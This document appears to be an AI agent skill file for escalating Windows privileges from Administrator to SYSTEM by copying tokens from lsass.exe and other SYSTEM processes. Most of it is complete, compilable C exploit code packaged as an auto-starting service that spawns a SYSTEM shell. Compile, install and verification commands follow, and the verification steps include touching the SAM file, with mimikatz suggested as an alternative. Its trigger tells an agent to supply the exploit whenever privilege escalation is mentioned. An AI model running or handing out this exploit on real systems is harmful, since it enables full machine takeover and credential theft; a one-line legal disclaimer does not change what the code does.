---
name: windows-token-escalation
description: Windows local privilege escalation using SeDebug + SeImpersonate token copying. Use this skill when the user is doing Windows penetration testing, security assessments, or privilege escalation research and needs to escalate from Administrator to SYSTEM by copying tokens from privileged processes like lsass.exe, services.exe, or svchost.exe. Trigger this when users mention Windows privilege escalation, token manipulation, SeDebug, SeImpersonate, or need to gain SYSTEM access.
---

# Windows Token Escalation: SeDebug + SeImpersonate

This skill helps you escalate privileges from Administrator to SYSTEM on Windows by exploiting the SeDebug and SeImpersonate privileges to copy tokens from high-privilege processes.

## When to Use This Technique

Use this approach when:
- You have Administrator access but need SYSTEM privileges
- The target system has SeDebug and SeImpersonate privileges enabled
- You're conducting authorized penetration testing or security assessments
- You need to access protected resources requiring SYSTEM access

## How It Works

The exploit leverages two critical Windows privileges:

1. **SeDebugPrivilege** - Allows debugging and manipulating processes
2. **SeImpersonatePrivilege** - Allows impersonating other users/processes

The technique:
1. Find a process running as SYSTEM (like `lsass.exe`)
2. Open that process with `PROCESS_QUERY_INFORMATION`
3. Extract its primary token using `OpenProcessToken`
4. Duplicate the token with `DuplicateTokenEx`
5. Spawn a new process (like `cmd.exe`) using the duplicated token

## Target Processes

Common SYSTEM processes you can target:
- `lsass.exe` - Local Security Authority Subsystem Service (most common)
- `services.exe` - Service Control Manager
- `svchost.exe` - Service Host (one of the first instances)
- `wininit.exe` - Windows Initialization
- `csrss.exe` - Client/Server Runtime Subsystem

**Important:** You cannot copy tokens from Protected processes (like those with PatchGuard protection).

## The Exploit Code

```c
// Token Escalation Exploit - SeDebug + SeImpersonate
// Compile as a Windows service binary for testing
// WARNING: Only use in authorized environments

#include <windows.h>
#include <tlhelp32.h>
#include <tchar.h>
#pragma comment (lib, "advapi32")

TCHAR* serviceName = TEXT("TokenDanceSrv");
SERVICE_STATUS serviceStatus;
SERVICE_STATUS_HANDLE serviceStatusHandle = 0;
HANDLE stopServiceEvent = 0;

// Find the PID of a process by name
int FindTarget(const char *procname) {
    HANDLE hProcSnap;
    PROCESSENTRY32 pe32;
    int pid = 0;

    hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (INVALID_HANDLE_VALUE == hProcSnap) return 0;

    pe32.dwSize = sizeof(PROCESSENTRY32);

    if (!Process32First(hProcSnap, &pe32)) {
        CloseHandle(hProcSnap);
        return 0;
    }

    while (Process32Next(hProcSnap, &pe32)) {
        if (lstrcmpiA(procname, pe32.szExeFile) == 0) {
            pid = pe32.th32ProcessID;
            break;
        }
    }

    CloseHandle(hProcSnap);
    return pid;
}

// Main exploit function - this is where elevation occurs
int Exploit(void) {
    HANDLE hSystemToken, hSystemProcess;
    HANDLE dupSystemToken = NULL;
    HANDLE hProcess, hThread;
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    int pid = 0;

    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));

    // Step 1: Open high privileged process (lsass.exe)
    if (pid = FindTarget("lsass.exe"))
        hSystemProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
    else
        return -1;

    // Step 2: Extract high privileged token
    if (!OpenProcessToken(hSystemProcess, TOKEN_ALL_ACCESS, &hSystemToken)) {
        CloseHandle(hSystemProcess);
        return -1;
    }

    // Step 3: Make a copy of the token
    DuplicateTokenEx(hSystemToken, TOKEN_ALL_ACCESS, NULL, 
                     SecurityImpersonation, TokenPrimary, &dupSystemToken);

    // Step 4: Spawn a new process with higher privileges
    CreateProcessAsUserA(dupSystemToken, "C:\\windows\\system32\\cmd.exe",
                        NULL, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);

    CloseHandle(hSystemProcess);
    CloseHandle(hSystemToken);
    CloseHandle(dupSystemToken);
    
    return 0;
}

// Service control handler
void WINAPI ServiceControlHandler(DWORD controlCode) {
    switch (controlCode) {
        case SERVICE_CONTROL_SHUTDOWN:
        case SERVICE_CONTROL_STOP:
            serviceStatus.dwCurrentState = SERVICE_STOP_PENDING;
            SetServiceStatus(serviceStatusHandle, &serviceStatus);
            SetEvent(stopServiceEvent);
            return;
        case SERVICE_CONTROL_PAUSE:
        case SERVICE_CONTROL_CONTINUE:
        case SERVICE_CONTROL_INTERROGATE:
            break;
        default:
            break;
    }
    SetServiceStatus(serviceStatusHandle, &serviceStatus);
}

// Service main function
void WINAPI ServiceMain(DWORD argc, TCHAR* argv[]) {
    // Initialize service status
    serviceStatus.dwServiceType = SERVICE_WIN32;
    serviceStatus.dwCurrentState = SERVICE_STOPPED;
    serviceStatus.dwControlsAccepted = 0;
    serviceStatus.dwWin32ExitCode = NO_ERROR;
    serviceStatus.dwServiceSpecificExitCode = NO_ERROR;
    serviceStatus.dwCheckPoint = 0;
    serviceStatus.dwWaitHint = 0;

    serviceStatusHandle = RegisterServiceCtrlHandler(serviceName, ServiceControlHandler);

    if (serviceStatusHandle) {
        // Service is starting
        serviceStatus.dwCurrentState = SERVICE_START_PENDING;
        SetServiceStatus(serviceStatusHandle, &serviceStatus);

        stopServiceEvent = CreateEvent(0, FALSE, FALSE, 0);

        // Running
        serviceStatus.dwControlsAccepted |= (SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN);
        serviceStatus.dwCurrentState = SERVICE_RUNNING;
        SetServiceStatus(serviceStatusHandle, &serviceStatus);

        // Execute the exploit
        Exploit();
        WaitForSingleObject(stopServiceEvent, -1);

        // Service was stopped
        serviceStatus.dwCurrentState = SERVICE_STOP_PENDING;
        SetServiceStatus(serviceStatusHandle, &serviceStatus);

        CloseHandle(stopServiceEvent);
        stopServiceEvent = 0;

        // Service is now stopped
        serviceStatus.dwControlsAccepted &= ~(SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN);
        serviceStatus.dwCurrentState = SERVICE_STOPPED;
        SetServiceStatus(serviceStatusHandle, &serviceStatus);
    }
}

// Install the service
void InstallService() {
    SC_HANDLE serviceControlManager = OpenSCManager(0, 0, SC_MANAGER_CREATE_SERVICE);

    if (serviceControlManager) {
        TCHAR path[_MAX_PATH + 1];
        if (GetModuleFileName(0, path, sizeof(path)/sizeof(path[0])) > 0) {
            SC_HANDLE service = CreateService(serviceControlManager,
                            serviceName, serviceName,
                            SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS,
                            SERVICE_AUTO_START, SERVICE_ERROR_IGNORE, path,
                            0, 0, 0, 0, 0);
            if (service)
                CloseServiceHandle(service);
        }
        CloseServiceHandle(serviceControlManager);
    }
}

// Uninstall the service
void UninstallService() {
    SC_HANDLE serviceControlManager = OpenSCManager(0, 0, SC_MANAGER_CONNECT);

    if (serviceControlManager) {
        SC_HANDLE service = OpenService(serviceControlManager,
            serviceName, SERVICE_QUERY_STATUS | DELETE);
        if (service) {
            SERVICE_STATUS serviceStatus;
            if (QueryServiceStatus(service, &serviceStatus)) {
                if (serviceStatus.dwCurrentState == SERVICE_STOPPED)
                    DeleteService(service);
            }
            CloseServiceHandle(service);
        }
        CloseServiceHandle(serviceControlManager);
    }
}

int _tmain(int argc, TCHAR* argv[]) {
    if (argc > 1 && lstrcmpi(argv[1], TEXT("install")) == 0) {
        InstallService();
    }
    else if (argc > 1 && lstrcmpi(argv[1], TEXT("uninstall")) == 0) {
        UninstallService();
    }
    else {
        SERVICE_TABLE_ENTRY serviceTable[] = {
            { serviceName, ServiceMain },
            { 0, 0 }
        };

        StartServiceCtrlDispatcher(serviceTable);
    }

    return 0;
}
```

## Compilation and Usage

### Compile the Exploit

```bash
# Using Visual Studio Developer Command Prompt
cl /EHsc token_exploit.c advapi32.lib

# Or using MinGW
x86_64-w64-mingw32-gcc -o token_exploit.exe token_exploit.c -ladvapi32
```

### Install and Run as Service

```cmd
# Install the service (run as Administrator)
token_exploit.exe install

# Start the service
net start TokenDanceSrv

# Check if cmd.exe spawned with SYSTEM privileges
# Look for a new cmd.exe process running as SYSTEM

# Uninstall when done
token_exploit.exe uninstall
```

## Verification

To verify the exploit worked:

1. **Check for new cmd.exe process** - A new command prompt should appear
2. **Verify SYSTEM access** - In the spawned cmd, run:
   ```cmd
   whoami
   ```
   Should return `nt authority\system`

3. **Access protected resources** - Try accessing:
   ```cmd
   dir C:\Windows\System32\config\SAM
   ```

## Tools for Analysis

### Process Hacker
Use [Process Hacker](https://processhacker.sourceforge.io/downloads.php) to:
- View process tokens and privileges
- Identify which processes are running as SYSTEM
- Check which processes are Protected (cannot be token-copied)

### PowerShell Commands

```powershell
# Check current privileges
whoami /priv

# List SYSTEM processes
Get-Process | Where-Object {$_.Owner -eq "NT AUTHORITY\SYSTEM"}

# Check if SeDebug and SeImpersonate are enabled
whoami /priv | Select-String "SeDebugPrivilege,SeImpersonatePrivilege"
```

## Safety and Legal Considerations

**⚠️ IMPORTANT:**
- Only use this technique on systems you own or have explicit authorization to test
- This is for educational and authorized penetration testing purposes only
- Unauthorized privilege escalation is illegal and unethical
- Document all testing activities and get proper authorization

## Troubleshooting

### Common Issues

1. **"Access Denied" when opening process**
   - Ensure you're running as Administrator
   - Check if the target process is Protected

2. **lsass.exe not found or protected**
   - Try alternative targets: `services.exe`, `svchost.exe`, `wininit.exe`
   - On newer Windows versions, lsass may be protected by LSA Protection

3. **Service won't start**
   - Check Windows Event Viewer for errors
   - Ensure the binary path is correct
   - Verify the service account has necessary permissions

4. **Token duplication fails**
   - Verify SeDebug and SeImpersonate privileges are enabled
   - Check if the process has the necessary access rights

## Alternative Approaches

If this technique doesn't work:
- Try other privilege escalation methods (misconfigured services, unquoted service paths, etc.)
- Use existing tools like `mimikatz` for token manipulation
- Consider kernel-level exploits if available and appropriate

## References

- [HackTricks Windows Privilege Escalation](https://book.hacktricks.xyz/windows/windows-local-privilege-escalation)
- [Microsoft: DuplicateTokenEx](https://docs.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-duplicatetokenex)
- [Microsoft: CreateProcessAsUser](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessasusera)
